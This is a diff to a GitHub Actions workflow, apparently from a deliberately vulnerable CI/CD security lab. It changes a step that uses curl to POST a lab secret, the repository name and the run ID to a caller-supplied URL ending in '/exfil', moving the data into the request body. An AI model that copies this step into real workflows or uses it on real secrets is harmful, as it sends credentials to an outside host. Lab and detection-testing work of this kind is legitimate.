@@ -23,10 +23,12 @@ jobs:
           LAB_SECRET: ${{ secrets.GOAT_FAKE_SECRET }}
           CALLBACK_URL: ${{ inputs.callback_url }}
         run: |
+          # PUT EVERYTHING IN POST BODY instead of URL parameters
           curl -sS -i -L --max-time 15 -X POST \
-            --data "secret=${LAB_SECRET}&repo=${GITHUB_REPOSITORY}&run=${GITHUB_RUN_ID}" \
-            "${CALLBACK_URL%/}/exfil?src=gha-${GITHUB_RUN_ID}"
-
+            --data "secret=${LAB_SECRET}&repo=${GITHUB_REPOSITORY}&run=${GITHUB_RUN_ID}&timestamp=$(date)" \
+            "${CALLBACK_URL%/}/exfil" \
+            -H "Content-Type: application/json"
+      
       - name: Other outbound calls
         run: |
           curl https://google.com -L || true
